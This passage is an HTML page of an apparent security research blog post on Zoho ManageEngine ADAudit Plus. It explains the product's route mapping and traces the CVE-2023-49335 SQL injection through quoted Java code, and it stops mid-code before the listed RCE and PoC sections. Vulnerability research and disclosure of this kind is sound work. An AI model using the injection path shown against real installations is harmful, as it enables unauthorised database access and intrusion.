@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ManageEngine Adaudit Plus – From SQLi to RCE | nhienit</title>
+<meta name="keywords" content="research">
+<meta name="description" content="Analysis about Manage Engine ADAudit Plus CVE">
+<meta name="author" content="nhienit">
+<link rel="canonical" href="http://localhost:1313/posts/me_sqli_to_rce/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/me_sqli_to_rce/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/posts/me_sqli_to_rce/">
+  <meta property="og:site_name" content="nhienit">
+  <meta property="og:title" content="ManageEngine Adaudit Plus – From SQLi to RCE">
+  <meta property="og:description" content="Analysis about Manage Engine ADAudit Plus CVE">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-10T21:05:44+07:00">
+    <meta property="article:modified_time" content="2025-11-10T21:05:44+07:00">
+    <meta property="article:tag" content="Research">
+      <meta property="og:image" content="http://localhost:1313/images/papermod-cover.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/images/papermod-cover.png">
+<meta name="twitter:title" content="ManageEngine Adaudit Plus – From SQLi to RCE">
+<meta name="twitter:description" content="Analysis about Manage Engine ADAudit Plus CVE">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ManageEngine Adaudit Plus – From SQLi to RCE",
+      "item": "http://localhost:1313/posts/me_sqli_to_rce/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ManageEngine Adaudit Plus – From SQLi to RCE",
+  "name": "ManageEngine Adaudit Plus – From SQLi to RCE",
+  "description": "Analysis about Manage Engine ADAudit Plus CVE",
+  "keywords": [
+    "research"
+  ],
+  "articleBody": "Chuyện lâu rồi giờ mới kể là dạo gần đây mình có dịp được nghiên cứu về các sản phẩm open-source và target lần này mình chọn đó là ManageEngine Adaudit Plus, một sản phẩm của Zoho.\nTrước đó product này cũng có nhiều CVE nghiêm trọng rồi nhưng may mắn thay là lần này sau một thời gian audit mã nguồn thì mình vẫn tìm được một số lỗ hổng nghiêm trọng khác đang còn tồn đọng trên ứng dụng này, nên mình viết bài này để chia sẻ một số thứ về chúng và cũng mong muốn rằng đây có thể là một phần tài liệu cho những ai sắp hoặc đang có ý định nghiên cứu về những products của ZOHO.\nManageEngine ADAudit Plus là một giải pháp giám sát và báo cáo hoạt động Active Directory toàn diện, cung cấp bởi ManageEngine. Đây là một công cụ quan trọng cho việc đảm bảo tuân thủ quy định, bảo mật dữ liệu và quản lý hiệu suất hệ thống ( theo Chat-GPT =]]] ).\n#Effected version Zoho ManageEngine Adaudit Plus 7.2.0 Build 7250\n#Remote debug Để thực hiện việc remote debug thì điều tiên ta cần extract hết các libs có trong thư mục cài đặt:\nfind . -type f -iname *.jar -exec cp {} adap_jars/ \\; Theo cá nhân mình để remote debug thì chỉ cần sửa lại file /bin/run.bat từ if \"%1\" == \"debug\" thành if \"debug\" == \"debug\" là được =))))\n#Route handling Trước khi phân tích sâu vào lỗ hổng thì mình sẽ nói sơ qua một chút về URL Mapping trên các ứng dụng ManageEngine.\nNhư bao các ứng dụng Java Web khác, các url pattern và các filters đều được định nghĩa ở các file .xml. Ví dụ như web.xml file, có thể cho ta biết được một endpoint sẽ được handle bởi một class tương ứng nào đó hoặc phải đi qua những filter chain nào, …\nVí dụ như file /webapps/adap/WEB-INF/web.xml định nghĩa như sau:\n… ADSMServerStatusServlet com.adventnet.sym.adsm.servlet.ADSMServerStatusServlet … ADSMServerStatusServlet /servlet/ADSMServerStatus … Điều này được hiểu đơn giản rằng /servlet/ADSMServerStatus endpoint được handle bởi class com.adventnet.sym.adsm.servlet.ADSMServerStatusServlet.\nNgoài ra, một điều không kém phần quan trọng nữa rằng ở file /webapps/adap/WEB-INF/security/security.xml cho ta biết được rằng request đến một api endpoint sẽ cần những tham số nào, gọi bằng http method nào, có cần csrf token hay không, …\n… ",
+  "wordCount" : "3121",
+  "inLanguage": "en",
+  "image": "http://localhost:1313/images/papermod-cover.png","datePublished": "2025-11-10T21:05:44+07:00",
+  "dateModified": "2025-11-10T21:05:44+07:00",
+  "author":[{
+    "@type": "Person",
+    "name": "nhienit"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/posts/me_sqli_to_rce/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "nhienit",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="nhienit (Alt + H)">nhienit</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/archives/" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      ManageEngine Adaudit Plus – From SQLi to RCE
+    </h1>
+    <div class="post-description">
+      Analysis about Manage Engine ADAudit Plus CVE
+    </div>
+    <div class="post-meta"><span title='2025-11-10 21:05:44 +0700 +07'>November 10, 2025</span>&nbsp;·&nbsp;<span>15 min</span>&nbsp;·&nbsp;<span>nhienit</span>&nbsp;|&nbsp;<span>
+    <a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/me_sqli_to_rce.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>
+</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#effected-version" aria-label="#Effected version">#Effected version</a></li>
+                <li>
+                    <a href="#remote-debug" aria-label="#Remote debug">#Remote debug</a></li>
+                <li>
+                    <a href="#route-handling" aria-label="#Route handling">#Route handling</a></li>
+                <li>
+                    <a href="#cve-2023-49335" aria-label="#CVE-2023-49335">#CVE-2023-49335</a></li>
+                <li>
+                    <a href="#cve-2024-21791" aria-label="#CVE-2024-21791">#CVE-2024-21791</a></li>
+                <li>
+                    <a href="#rce-with-postgresql-" aria-label="#RCE with PostgreSQL ????">#RCE with PostgreSQL ????</a></li>
+                <li>
+                    <a href="#find-the-puzzle-pieces-to-achieve-rce" aria-label="#Find the puzzle pieces to achieve RCE">#Find the puzzle pieces to achieve RCE</a><ul>
+                        
+                <li>
+                    <a href="#idea-1-t%c3%acm-l%e1%bb%97-h%e1%bb%95ng-file-upload-tu%e1%bb%b3-%c3%bd-" aria-label="#Idea 1: Tìm lỗ hổng file upload tuỳ ý ??">#Idea 1: Tìm lỗ hổng file upload tuỳ ý ??</a></li>
+                <li>
+                    <a href="#idea-2-t%c3%acm-l%e1%bb%97-h%e1%bb%95ng-command-injection-trong-ch%e1%bb%a9c-n%c4%83ng-run-alert-script-" aria-label="#Idea 2: Tìm lỗ hổng command injection trong chức năng run alert script ??">#Idea 2: Tìm lỗ hổng command injection trong chức năng run alert script ??</a></li>
+                <li>
+                    <a href="#idea-3-change-defaultscriptpath" aria-label="#Idea 3: Change defaultScriptPath">#Idea 3: Change defaultScriptPath</a></li></ul>
+                </li>
+                <li>
+                    <a href="#step-to-reproduces" aria-label="#Step to reproduces">#Step to reproduces</a></li>
+                <li>
+                    <a href="#poc" aria-label="#PoC">#PoC</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>Chuyện lâu rồi giờ mới kể là dạo gần đây mình có dịp được nghiên cứu về các sản phẩm open-source và target lần này mình chọn đó là ManageEngine Adaudit Plus, một sản phẩm của Zoho.</p>
+<p>Trước đó product này cũng có nhiều CVE nghiêm trọng rồi nhưng may mắn thay là lần này sau một thời gian audit mã nguồn thì mình vẫn tìm được một số lỗ hổng nghiêm trọng khác đang còn tồn đọng trên ứng dụng này, nên mình viết bài này để chia sẻ một số thứ về chúng và cũng mong muốn rằng đây có thể là một phần tài liệu cho những ai sắp hoặc đang có ý định nghiên cứu về những products của ZOHO.</p>
+<p>ManageEngine ADAudit Plus là một giải pháp giám sát và báo cáo hoạt động Active Directory toàn diện, cung cấp bởi ManageEngine. Đây là một công cụ quan trọng cho việc đảm bảo tuân thủ quy định, bảo mật dữ liệu và quản lý hiệu suất hệ thống ( theo Chat-GPT =]]] ).</p>
+<h3 id="effected-version">#Effected version<a hidden class="anchor" aria-hidden="true" href="#effected-version">#</a></h3>
+<p>Zoho ManageEngine Adaudit Plus 7.2.0 Build 7250</p>
+<h3 id="remote-debug">#Remote debug<a hidden class="anchor" aria-hidden="true" href="#remote-debug">#</a></h3>
+<p>Để thực hiện việc remote debug thì điều tiên ta cần extract hết các libs có trong thư mục cài đặt:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find . -type f -iname *.jar -exec cp <span class="o">{}</span> adap_jars/ <span class="se">\;</span>
+</span></span></code></pre></div><p>Theo cá nhân mình để remote debug thì chỉ cần sửa lại file <code>/bin/run.bat</code> từ <code>if &quot;%1&quot; == &quot;debug&quot;</code> thành <code>if &quot;debug&quot; == &quot;debug&quot;</code> là được =))))</p>
+<h3 id="route-handling">#Route handling<a hidden class="anchor" aria-hidden="true" href="#route-handling">#</a></h3>
+<p>Trước khi phân tích sâu vào lỗ hổng thì mình sẽ nói sơ qua một chút về URL Mapping trên các ứng dụng ManageEngine.</p>
+<p>Như bao các ứng dụng Java Web khác, các url pattern và các filters đều được định nghĩa ở các file <code>.xml</code>. Ví dụ như <code>web.xml</code> file, có thể cho ta biết được một endpoint sẽ được handle bởi một class tương ứng nào đó hoặc phải đi qua những filter chain nào, …</p>
+<p>Ví dụ như file <code>/webapps/adap/WEB-INF/web.xml</code> định nghĩa như sau:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">…
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;servlet&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;servlet-name&gt;</span>ADSMServerStatusServlet<span class="nt">&lt;/servlet-name&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;servlet-class&gt;</span>com.adventnet.sym.adsm.servlet.ADSMServerStatusServlet<span class="nt">&lt;/servlet-class&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/servlet&gt;</span>
+</span></span><span class="line"><span class="cl">…
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;servlet-mapping&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;servlet-name&gt;</span>ADSMServerStatusServlet<span class="nt">&lt;/servlet-name&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;url-pattern&gt;</span>/servlet/ADSMServerStatus<span class="nt">&lt;/url-pattern&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/servlet-mapping&gt;</span>
+</span></span><span class="line"><span class="cl">…
+</span></span></code></pre></div><p>Điều này được hiểu đơn giản rằng <code>/servlet/ADSMServerStatus</code> endpoint được handle bởi class <code>com.adventnet.sym.adsm.servlet.ADSMServerStatusServlet</code>.</p>
+<p>Ngoài ra, một điều không kém phần quan trọng nữa rằng ở file <code>/webapps/adap/WEB-INF/security/security.xml</code> cho ta biết được rằng request đến một api endpoint sẽ cần những tham số nào, gọi bằng http method nào, có cần csrf token hay không, …</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">…
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;url</span> <span class="na">path=</span><span class="s">&#34;/api/json/fileanalysis/getFileAnalysisReportIds&#34;</span> <span class="na">dynamic-params=</span><span class="s">&#34;false&#34;</span> <span class="na">csrf=</span><span class="s">&#34;true&#34;</span> <span class="na">method=</span><span class="s">&#34;post&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;url</span> <span class="na">path=</span><span class="s">&#34;/api/json/fileanalysis/getFileServers&#34;</span> <span class="na">dynamic-params=</span><span class="s">&#34;false&#34;</span> <span class="na">csrf=</span><span class="s">&#34;true&#34;</span> <span class="na">method=</span><span class="s">&#34;post&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">&#34;JSONString&#34;</span> <span class="na">type=</span><span class="s">&#34;JSONObject&#34;</span> <span class="na">max-len=</span><span class="s">&#34;-1&#34;</span> <span class="na">template=</span><span class="s">&#34;FileAnalysisServerJSON&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/url&gt;</span>
+</span></span><span class="line"><span class="cl">…
+</span></span></code></pre></div><p>Ngoài ra, ở class RestAPIHandler có một thuộc tính khá hay ho đó là apiMapping, thuộc tính này bao gồm danh sách chi tiết các api endpoint có thể xử lý và bên trong đó thể hiện chi tiết cả class lẫn method để handle api endpoint đó.</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/1.png"></p>
+<p>Ngoài ra còn một số file khác nữa như <code>conf/adap/rest-api.xml</code>, <code>conf/adap/restapi-client-conf.xml</code>, <code>conf/FileAnalysis/restapi.xml</code>,… nhưng đối với mình thường cách tốt nhất để tìm một method nào đó có được call trực tiếp thông qua endpoint nào hay không bằng cách là extract hết tất cả các file .xml ra một folder, thực hiện search và trace trực tiếp.</p>
+<h3 id="cve-2023-49335">#CVE-2023-49335<a hidden class="anchor" aria-hidden="true" href="#cve-2023-49335">#</a></h3>
+<p>Lỗ hổng xuất hiện ở chức năng <code>getFileServers</code> tại class <code>com.adventnet.sym.adsm.auditing.webclient.ember.api.fileanalysis.FileAnalysisHandler</code>, ta thấy rằng ở <code>conf/FileAnalysis/restapi.xml</code> được định nghĩa như sau:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;ADAPRestApiMapping</span>
+</span></span><span class="line"><span class="cl">        <span class="na">UNIQUE_ID=</span><span class="s">&#34;ADAPRestApiMapping:UNIQUE_ID:763&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">TAB_NAME=</span><span class="s">&#34;fileAnalysis&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">URL_PATH=</span><span class="s">&#34;/fileanalysis/getFileServers&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">CLASS_NAME=</span><span class="s">&#34;com.adventnet.sym.adsm.auditing.webclient.ember.api.fileanalysis.FileAnalysisHandler&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">METHOD_NAME=</span><span class="s">&#34;getFileServers&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">DESCRIPTION=</span><span class="s">&#34;Get Configured File Servers&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>thì để call được <code>getFileServers</code> method thì restapi endpoint có url path là <code>/fileanalysis/getFileServers</code>. Thường các restapi sẽ có prefix là /api/json hoặc /api/xml</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/2.png"></p>
+<p>sau đó sẽ được <code>RestAPIHandler</code> xoá phần prefix và phần còn lại của url sẽ được dò trong apiMapping đã nói như ở bên trên.</p>
+<p>Tóm lại là request đến <code>/api/json/fileanalysis/getFileServers</code> để call chức năng <code>com.adventnet.sym.adsm.auditing.webclient.ember.api.fileanalysis.FileAnalysisHandler:getFileServers()</code>.</p>
+<p>Về phần hàm <code>getFileServers()</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">getFileServers</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">reqData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONObject</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;JSONString&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">serverInputParams</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reqData</span><span class="p">.</span><span class="na">getJSONObject</span><span class="p">(</span><span class="s">&#34;inputParams&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">returnListMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getFileServers</span><span class="p">(</span><span class="n">serverInputParams</span><span class="p">,</span><span class="w"> </span><span class="n">domainName</span><span class="p">,</span><span class="w"> </span><span class="n">rb</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>Cơ bản chổ này chương trình sẽ lấy untrust data từ tham số JSONString dưới dạng json từ user và sau đó tiếp tục lấy từ JSONString một json object khác từ thuộc tính inputParams, dữ liệu này sẽ được đặt vào hàm static <code>getFileServers()</code> xử lý tiếp.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">getFileServers</span><span class="p">(</span><span class="n">JSONObject</span><span class="w"> </span><span class="n">serverInputParams</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">domainName</span><span class="p">,</span><span class="w"> </span><span class="n">AdventNetResourceBundle</span><span class="w"> </span><span class="n">rb</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">returnListMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">uvhString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;AUDCVConfig:cv_id:200100&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serverInputParams</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;serverType&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;fs&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FileAnalysisServerHandler</span><span class="p">.</span><span class="na">getConfiguredServersCount</span><span class="p">(</span><span class="n">serverInputParams</span><span class="p">,</span><span class="w"> </span><span class="n">domainName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ...</span><span class="w">
+</span></span></span></code></pre></div><p>tiếp theo, đặt input tiếp tục vào hàm <code>FileAnalysisServerHandler.getConfiguredServersCount()</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">getConfiguredServersCount</span><span class="p">(</span><span class="n">JSONObject</span><span class="w"> </span><span class="n">serverInputParams</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">domainName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0L</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">searchData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serverInputParams</span><span class="p">.</span><span class="na">optJSONObject</span><span class="p">(</span><span class="s">&#34;searchData&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">searchData</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ADSMComputerGeneralDetails.NAME LIKE &#39;%&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">searchData</span><span class="p">.</span><span class="na">optString</span><span class="p">(</span><span class="s">&#34;NAME&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;%&#39;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">getCount</span><span class="p">(</span><span class="n">domainName</span><span class="p">,</span><span class="w"> </span><span class="n">searchCriteria</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>Lỗ hổng SQL injection xuất hiện khá là cơ bản tại đây khi ta có thể hoàn toàn điều chỉnh được phần điều kiện thông qua biến <code>searchCriteria</code> bằng việc cộng chuỗi với giá trị từ trường <code>NAME</code> được lấy từ <code>serverInputParams</code>. Và biến <code>searchCriteria</code> sẽ được đặt tiếp vào hàm static <code>getCount()</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getCount</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">domainName</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">searchCriteria</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">rowsCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">cvId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DBObjectUtil</span><span class="p">.</span><span class="na">getUVHValues</span><span class="p">(</span><span class="s">&#34;AUDCVConfig&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;AUDCVConfig:cv_id:200201&#34;</span><span class="p">);</span><span class="w">
